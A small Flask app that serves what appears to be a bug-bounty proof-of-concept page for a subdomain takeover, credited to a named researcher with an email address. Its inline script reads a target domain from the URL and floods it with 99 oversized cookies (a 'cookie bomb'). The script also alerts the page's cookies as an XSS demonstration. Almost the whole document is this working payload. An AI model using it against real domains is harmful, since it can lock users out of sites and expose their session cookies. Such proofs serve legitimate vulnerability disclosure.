from flask import Flask
app = Flask(__name__)

@app.route("/")
def hello():
    return '''

<html><body>
<script>
function getSearchParameters() {
    var prmstr = window.location.search.substr(1);
    return prmstr != null && prmstr != "" ? transformToAssocArray(prmstr) : {};
}

function transformToAssocArray( prmstr ) {
    var params = {};
    var prmarr = prmstr.split("&");
    for ( var i = 0; i < prmarr.length; i++) {
        var tmparr = prmarr[i].split("=");
        params[tmparr[0]] = tmparr[1];
    }
    return params;
}

var params = getSearchParameters();

if(params.cookiebomb == "1") {
var base_domain = params.domain;
var pollution = Array(4000).join('a');
for(var i=1;i<100;i++){
    document.cookie='bomb'+i+'='+pollution+';Domain='+base_domain;
}
  alert("Cookie Bomb Successfull");  
  
}
alert(document.cookie);
alert("XSS by Riya");
</script>
<h1><center>Subdomain Takeover by Riya</h1><br><br><h4>Email : jindalriya01@gmail.com</h4></center></body></html>
'''
